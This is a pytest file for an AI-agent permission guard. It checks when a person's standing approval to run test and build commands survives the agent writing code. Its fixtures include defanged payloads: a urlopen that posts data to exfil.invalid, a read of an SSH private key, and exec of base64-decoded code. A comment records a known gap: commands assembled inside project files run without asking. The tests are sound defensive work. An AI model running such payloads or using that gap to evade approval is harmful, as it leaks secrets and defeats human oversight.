"""r0271 (ISPYTANIE-0266-1311 Н1): "from now on" for a test runner / build outside quiet mode survives the agent writing code.

Before: a rule on `npm test` / `make build` / `mypy` / `jest` / `pytest` stopped working after ONE Write of a code file (the 0.2.90 rule: any
code-like file the agent wrote is risky -> ESCALATE_WRITTEN_RUN), and "from now on" was no longer offered, while TRUST_TEXT (signed by the
person) said "the agent can then run code it wrote in this project without asking you". Now, under the rule, a written file holds the run
only when its mark shows what the person did not trust: a text the witness could not read or parse, a gate (network, keys, persistence,
outside the project), script findings, a path outside the rule's project.
Harmless payloads: .invalid hosts, a key path under a fake home.
"""
import base64
import os

import pytest

import wa_profile as wa
from app import actions, allowances, wire
from svidetel_v4.state import mandate_hash
from tests.test_0224_critique import Agent
from tests.test_n15_2910 import _bump
from tests.test_r25_s8 import reasons



@pytest.fixture(autouse=True)
def _code_risky(monkeypatch):
    """The rule under test is the 0.2.90 one (every code-like file the agent wrote is marked): conftest switches it off for older tests."""
    from app import execguard
    monkeypatch.setattr(execguard, "WRITTEN_CODE_RISKY", True)


CLEAN = "def add(a, b):\n    return a + b\n"
NET = "import urllib.request\nurllib.request.urlopen('https://exfil.invalid/x', data=b'1')\n"
RUNNERS = ["npm test", "make build", "mypy .", "jest"]     # pytest is on the fixture's LIST (not a rule): the 0.2.90 hold stays there


def _vpred(a, line):
    """The person answers the question of `line` with "Allow this from now on" (the server's offer, signed) -> the offer."""
    v, parts = a.line(line)
    assert v == "ASK", parts
    out = None
    for _, vv, _, rid in parts:
        if vv != "defer":
            continue
        g = a.c.get("/api/approvals/" + rid).json()
        o = g.get("allowance_offer") or {}
        out = o
        if not o.get("eligible"):
            a.o.approve(rid)
            continue
        al = {"v": "deus-aar-0.1", "t": "allowance", "id": "al_" + base64.b32encode(os.urandom(16)).decode().rstrip("=")[:26],
              "mandate": mandate_hash(wire.cbor_form(g["mandate"])), "class": "command", "commands": o["commands"], "project": o["project"],
              "nbf": o["t"], "exp": o["t"] + 30 * 86400}
        r = a.o.post("/api/allowances", rid=rid, envelope_b64=a.o.sign(allowances.TYP, wa.cde(al)))
        assert r.status_code == 200, r.text
        a.c.app.state.ctx.db.x("UPDATE allowances SET trust_v='tt-2' WHERE id=? AND trust_v IS NULL", (al["id"],))   # r1611: a rule signed with the text
    _bump(a)
    return out


def _agent(client, owner, tmp_path):
    a = Agent(client, owner, tmp_path, extra_cmds=[])
    for ln in RUNNERS:
        o = _vpred(a, ln)
        assert o and o.get("eligible"), (ln, o)
    return a


def test_rule_survives_clean_write(client, owner, tmp_path):
    a = _agent(client, owner, tmp_path)
    for i in range(3):
        a.tool("Write", {"file_path": a.proj + "/app.py", "content": CLEAN + "# %d\n" % i})
        a.tool("Edit", {"file_path": a.proj + "/app.py", "old_string": "a + b", "new_string": "b + a"})
        _bump(a)
        for ln in RUNNERS:
            v, p = a.line(ln)
            assert v == "ALLOW", (ln, p)
            assert "ESCALATE_WRITTEN_RUN" not in reasons(p), (ln, p)


@pytest.mark.parametrize("name,content", [
    ("helper.py", NET),                                                           # network (G2)
    ("k.py", "print(open(os.path.expanduser('~/.ssh/id_ed25519')).read())\n"),    # keys (G3)
    ("g.py", "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n"),          # code that builds what it runs (opaque)
])
def test_rule_still_holds_risky_text(client, owner, tmp_path, name, content):
    a = _agent(client, owner, tmp_path)
    w = a.tool("Write", {"file_path": a.proj + "/" + name, "content": content})
    assert all(x[1] in ("allow", "pass") for x in w), w
    _bump(a)
    v, p = a.line("npm test")
    assert v == "ASK" and "ESCALATE_WRITTEN_RUN" in reasons(p), p


def test_rule_still_holds_unseen_shell_write(client, owner, tmp_path):
    a = _agent(client, owner, tmp_path)
    src = os.path.join(a.home, "x.py")
    open(src, "w").write("print(1)\n")
    a.line("cp %s ./x.py" % src)                    # a copy from outside the project: the witness never saw the text
    _bump(a)
    v, p = a.line("make build")
    assert v == "ASK" and "ESCALATE_WRITTEN_RUN" in reasons(p), p


def test_offer_after_clean_write_and_not_after_risky(client, owner, tmp_path):
    a = Agent(client, owner, tmp_path, extra_cmds=[])
    a.tool("Write", {"file_path": a.proj + "/app.py", "content": CLEAN})
    _bump(a)
    o = _vpred(a, "npm test")                      # the page shows app.py (clean, read): "from now on" is offered
    assert o.get("eligible") is True, o
    a.tool("Write", {"file_path": a.proj + "/helper.py", "content": NET})
    _bump(a)
    o = _vpred(a, "make build")
    assert o.get("eligible") is False and "wrote" in (o.get("why_not") or ""), o


def test_clean_in_project_unit():
    P = "/home/u/proj"
    assert actions.clean_in_project({"by": "Write", "text": "x"}, P + "/a.py", P)
    assert actions.clean_in_project({"by": "Edit"}, P + "/src/b.py", P + "/")
    assert not actions.clean_in_project({"g": "G2"}, P + "/a.py", P)
    assert not actions.clean_in_project({"g": "unseen"}, P + "/a.py", P)
    assert not actions.clean_in_project({"dir": True}, P + "/d", P)
    assert not actions.clean_in_project({"sf": ["publish"]}, P + "/package.json", P)
    assert not actions.clean_in_project({}, "/home/u/proj2/a.py", P)              # a sibling with the same prefix
    assert not actions.clean_in_project({}, P + "/../other/a.py", P)
    assert not actions.clean_in_project({}, P + "/.git/hooks/pre-commit", P)
    assert not actions.clean_in_project({}, P, P)
    assert not actions.clean_in_project(None, P + "/a.py", P)
    assert not actions.clean_in_project({}, P + "/a.py", None)


def test_trust_text_names_the_limit():
    t = allowances.TRUST_TEXT
    assert "without asking you when Witness could read what it wrote" in t
    assert "network" in t and "keys" in t and "outside this project" in t


def test_trust_text_does_not_overpromise_r0326():
    # RT 15.11 B2: a dangerous command assembled inside a project file runs silently under "from now on"; the text must not say "every time" for it
    t = allowances.TRUST_TEXT
    assert "Dangerous commands the agent types" in t and "are still asked every time" in t
    assert "cannot promise to find every one" in t and "allow only a project whose code you trust" in t
    assert "Dangerous commands (recursive" not in t


def test_rule_signed_with_old_text_stays_valid_r0326():
    # the text is shown, never inside the signed allowance map: nothing in the payload or the check depends on it
    import inspect
    assert "TRUST_TEXT" not in inspect.getsource(allowances.create)
